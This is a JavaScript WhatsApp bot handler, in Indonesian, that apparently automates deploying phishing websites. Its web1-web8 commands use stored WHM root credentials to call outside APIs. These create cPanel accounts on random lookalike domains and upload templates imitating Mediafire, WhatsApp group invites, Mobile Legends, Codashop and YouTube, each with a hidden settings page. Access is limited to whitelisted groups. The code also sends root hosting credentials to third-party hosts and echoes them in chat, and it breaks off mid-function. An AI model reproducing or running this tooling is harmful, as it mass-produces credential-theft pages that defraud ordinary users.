const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins,updateDatabase } = require('./lib/functions.js')
const { exec } = require('child_process')
const fs = require('fs')
const request = require("request")
module.exports = async (deni, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = deni.user.id.split(':')[0]
const sender = msg.key.fromMe ? (deni.user.id.split(':')[0]+'@s.whatsapp.net' || deni.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await deni.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await deni.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0
// kirimprib(hasillrndy
const kirimprib =async(text,id) => { await deni.sendMessage(id,{text: text},{quoted:msg}) }
//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
switch (command) {

    // FITUR HOST BY DENI

    case 'deniweb' :
     id = msg.key.remoteJid
        if(validGrup(id,grups)){

        menu =`  =====DENI HOSTING=====

web1: Mediafire MP4 ( PROSES️ )
web2: Mediafire FILE ( PROSES️ )
web3: Simontok ( PROSES️ )
web4: Mobile Legends ( PROSES️ )
web5: Groupwa V1 ( PROSES️ )
web6: Groupwa V2 ( PROSES️ )
web7: Codashop( PROSES️ )
web8: Youtube ( PROSES️ )
web9: Free Firee Spin ( PROSES️ )
web10: Stumbel Guys ( PROSES️ )
web11: Dana Kaget ( PROSES️ )
    
Ketik: web1
Untuk web Mediafire MP4`
reply(menu)

        }else{
            reply("ini grup apa bangsat!")
        }
        break
      
        case 'update':
        if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `SILAHKAN DI SIMAK
jika ingin update url server ketik *${prefix}${command}* url | simontok.pro
             
jika ingin update username server ketik *${prefix}${command}* username | otakbokep
             
jika ingin update password server ketik *${prefix}${command}* password | @@##seringcoli##@@
             
jika ingin update ipaddress server ketik *${prefix}${command}* ip | 195.268.263.100
             
jika ingin tambah grup ketik *${prefix}${command}* grup | 120363024065162195@g.us
            `
            reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `INFO SETINGAN BOT HOST
            
-- DETAIL AKUN ROOT--
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
            
            `
            reply(info)
                }
                
            }
            
            break
            
            case 'infobot' :
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            id = msg.key.remoteJid
        
            info = `INFO SETINGAN BOT HOST
            
-- DETAIL AKUN ROOT--
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
            
            `
            reply(info);
            
            break
            
        case 'listgrup':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        let text = "LIST GRUP VIP :\n\n"
            for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            reply(text)
            
            
            break    
            case 'cekidgrup':
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await deni.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:msg})

            break 

//CASE HOST
case 'create' :
    reply("sedang membuat...")
    if(args != ""){
    parse = dn.split(" | ")
        user = parse[0]
        pass = parse[1]
        pkg = parse[2]
        
host = server[0].url
uroot = server[0].username
proot = server[0].password
domain = user +".login"
var inputt = {
    
                  server: host,
              uroot: uroot,
              proot: proot,
                 user: user,
              pass: pass,
              domain: domain,
              pkg: pkg,
          }
          
          request.post({
              url: 'https://shirai.my.id/api/create.php',
              form: inputt
            }, function(error, response, body){
    reply(body)
    })
    
    // console.log(parse)
}
        break

case 'ceksmtp' :
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
    var inputt = {
        
        server: host,
        uroot: uroot,
              proot: proot,
          }
          
          request.post({
              url: 'https://yogax.my.id/smtp.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
 
        break

case 'cekdefault' :
 
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
 var inputt = {
     
              server: host,
              uroot: uroot,
              proot: proot,
            }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/cekdefault.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
        break
        case 'termint' :
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            user = args[0]
            host = server[0].url
            uroot = server[0].username
proot = server[0].password
var inputt = {
    
              server: host,
              uroot: uroot,
              proot: proot,
              user: user,
            }
            
          request.post({
              url: 'https://randiramli.com/api/hosting/termint.php',
              form: inputt
            }, function(error, response, body){
                reply(body)
            })
            
            break
            case 'addpack' :
                if(args != ""){
                parse = dn.split(" | ")
                    user = parse[0]
                    pkg = parse[1]
 host = server[0].url
 uroot = server[0].username
 proot = server[0].password
 var inputt = {

     server: host,
              uroot: uroot,
              proot: proot,
              user: user,
              pkg: pkg,
          }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/addpack.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
}else{
    reply("masukin parameter bang!")
}
        break
//CASE HOST


case 'menuweb' :
    menuweb = `MENU CREATE WEB


web1: Mediafire MP4 ( ✅ )
web2: Mediafire FILE ( PERBAIKAN )
web3: Simontok ( PERBAIKAN )
web4: Mobile Legends ( PERBAIKAN )
web5: Groupwa V1 ( ✅ )
web6: Groupwa V2 ( PERBAIKAN )
web7: Codashop( PERBAIKAN )
web8: Youtube ( PERBAIKAN )
web9: Free Firee Spin ( ✅ )
web10: Stumbel Guys ( ✅ )
web11: Dana Kaget ( PROSES️ )
    
Ketik: web1
Untuk web Mediafire MP4`
reply(menuweb)
break


                  case 'web1' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "viralbokepnew2022.ml"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga/mediafire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mediafire MP4\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

case 'web2' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafiree" + makeid(7) + "." + "mediaflare1.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/mediafire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire2",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/mediafire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mediafire FILE\n==========================\nWebsite : https://${domin}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
	reply("ini grup siapa bangsat")
	}
break

case 'web3' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "simontok",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Simontok\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web4' :

id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobilelegends-event" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/mlbb/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mobile Legends\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web5' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "join-whatsapp" + makeid(7) + "." + "viralbokepnew2022.ml"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/groupwa1/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa1",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/groupwa1/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web GroupWA V1\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web6' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "chat-whatsapps" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/groupwa2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa2",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/groupwa2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web GroupWA V2\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web7' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashop" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "coda",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Codashop\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'web8' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "youtube" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/youtube/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "youtube",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/youtube/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Youtube\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
    }else{
            reply("ini grup apa bangsat!")
        }
break

case 'web9' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
